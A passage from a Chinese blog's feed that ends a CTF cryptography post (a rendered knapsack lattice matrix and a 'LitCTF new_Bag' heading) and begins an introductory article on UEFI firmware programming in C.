class="mord"><span class="mord">1</span></span></span><span style="top:-0.9674999999999991em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:0.2325000000000002em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:1.4324999999999994em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9799999999999995em;"><span style="top:-8.827499999999999em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-7.6274999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-5.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-4.567500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.1675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-0.9674999999999991em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:0.2325000000000002em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:1.4324999999999994em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9799999999999995em;"><span style="top:-8.639999999999999em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-7.4399999999999995em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-5.58em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-4.380000000000001em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-3.18em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-1.9800000000000002em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:-0.7799999999999991em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:0.4200000000000002em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span><span style="top:1.6199999999999994em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9799999999999995em;"><span style="top:-8.827499999999999em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-7.6274999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-4.567500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.1675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-0.9674999999999991em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:0.2325000000000002em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:1.4324999999999994em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9799999999999995em;"><span style="top:-8.827499999999999em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-7.6274999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-4.567500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-2.1675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-0.9674999999999991em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:0.2325000000000002em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:1.4324999999999994em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9799999999999995em;"><span style="top:-8.827499999999999em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-7.6274999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-4.567500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.1675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9674999999999991em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:0.2325000000000002em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:1.4324999999999994em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9799999999999995em;"><span style="top:-8.827499999999999em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-7.6274999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-4.567500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.1675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9674999999999991em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span></span></span><span style="top:0.2325000000000002em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:1.4324999999999994em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9799999999999995em;"><span style="top:-8.827499999999999em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-7.6274999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-4.567500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.1675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9674999999999991em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:0.2325000000000002em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:1.4324999999999994em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9799999999999995em;"><span style="top:-8.827499999999999em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-7.6274999999999995em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-4.567500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.1675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9674999999999991em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:0.2325000000000002em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:1.4324999999999994em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4799999999999995em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.963945000000002em;"><span style="top:1.6500649999999992em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:0.5000649999999993em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-0.09593500000000077em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-0.6919350000000009em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-1.287935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-1.883935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.479935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.075935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.671935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.267935000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.8639350000000015em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.4599350000000015em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-6.055935000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-6.651935000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-6.722925000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-7.963945000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.450085em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h2 id="题目4_litctf_new_bag"><a class="markdownIt-Anchor" href="#题目4_litctf_new_bag"></a> 题目4_LitCTF_new_Bag</h2><h1 id="参数不当"><a class="markdownIt-Anchor" href="#参数不当"></a> 参数不当</h1>]]></content>
    
    
    <summary type="html">前言：也算是第一次认真读了俩篇论文</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    
  </entry>
  
  <entry>
    <title>UEFI-编程开发C语言1-简介与预览</title>
    <link href="http://iyheart.github.io/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/"/>
    <id>http://iyheart.github.io/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/</id>
    <published>2025-05-03T04:35:27.000Z</published>
    <updated>2025-05-03T04:40:56.012Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>本系列文章主要参考：<a href="https://www.bilibili.com/video/BV1AUP8e4EZe/?spm_id_from=333.337.search-card.all.click">【双语视界】UEFI编程开发（C语言）: 第1课程-简介与概览_哔哩哔哩_bilibili</a></p></li><li><p>主要实现：开发一个<code>64</code>位，面向<code>x86</code>架构的长模式引导程序，为较新的机器编写<code>EFI</code>程序</p></li><li><p>了解更多关于<code>UEFI</code>编程的内容可以参考这个网站：<a href="https://uefi.org/">Home | Unified Extensible Firmware Interface Forum</a></p></li></ul><h1 id="uefi介绍"><a class="markdownIt-Anchor" href="#uefi介绍"></a> UEFI介绍</h1><h2 id="初步介绍"><a class="markdownIt-Anchor" href="#初步介绍"></a> 初步介绍</h2><ul><li><code>UEFI</code>的全称是<code>Unified Extensible Firmware Interface</code>即统一可扩展固件接口。它是用来定义操作系统与系统固件之间的软件界面，是作为BIOS的替代方案，可扩展固件接口负责加电自检、联系操作系统以及提供连接操作系统与硬件的接口。</li><li><code>UEFI</code>最初被称为<code>EFI</code>，最初是<code>Intel</code>公司开发，英特尔已于2005年将此规范格式交由<code>UEFI论坛</code>来推广与发展，这样对于<code>EFI</code>的标准就有了一个组织进行统一，所以<code>EFI</code>后来被更名为<code>UEFI</code>。</li><li>固件是机器中软件与硬件的中间层面，固件其实是一个软件，这个软件一般是存储在非易失性的<code>ROM</code>或者<code>Flash</code>上。</li></ul><p><img src="/2025/05/03/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/UEFI%E5%BC%80%E5%8F%91/UEFI-%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91C%E8%AF%AD%E8%A8%801-%E7%AE%80%E4%BB%8B%E4%B8%8E%E9%A2%84%E8%A7%88/image-20250318222015853.png" alt="image-20250318222015853"></p><ul><li><p><code>UEFI</code>其实就相当于一个管理固件的小型操作系统，这个操作系统向上为真正的操作系统，比如<code>Windows</code>、<code>Linux</code>，这些提供服务接口，向下又与真正的系统硬件、固件等进行交互。<code>UEFI</code>是用来取代<code>BIOS</code>的，所以<code>UEFI</code>会具有如下与<code>BIOS</code>相同的功能：</p><ul><li>硬件初始化：在计算机启动时，UEFI 负责对 CPU、内存、显卡、存储设备、网络等硬件进行初始化和配置。</li><li>执行电源自检（Power-On Self Test，POST）</li><li>初始化 CPU 和内存控制器</li><li>检测并配置 PCIe 设备、USB 